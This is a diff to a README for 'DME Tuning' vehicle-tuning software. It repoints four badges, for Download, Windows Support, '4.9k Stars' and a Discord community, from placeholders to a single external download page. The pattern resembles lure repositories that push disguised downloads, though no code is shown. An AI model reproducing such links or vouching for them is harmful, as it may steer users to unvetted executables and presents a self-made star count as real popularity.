@@ -4,10 +4,10 @@
 
 With DME Tuning, you can transform a stock vehicle into a high-performance machine while maintaining safety and reliability.
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Build-red?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-7%2F10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐ 4.9k Stars](https://img.shields.io/badge/⭐-4.9k%20Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Community](https://img.shields.io/badge/Join-Tuners%20Hub-green?style=for-the-badge\&logo=discord)](#)
+[![Download](https://img.shields.io/badge/Download-Latest%20Build-red?style=for-the-badge\&logo=rocket)](https://dme-tuning.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-7%2F10%2F11-blue?style=for-the-badge\&logo=windows)](https://dme-tuning.github.io/.github/)
+[![⭐ 4.9k Stars](https://img.shields.io/badge/⭐-4.9k%20Stars-yellow?style=for-the-badge\&logo=github)](https://dme-tuning.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Tuners%20Hub-green?style=for-the-badge\&logo=discord)](https://dme-tuning.github.io/.github/)
 
 ---
 
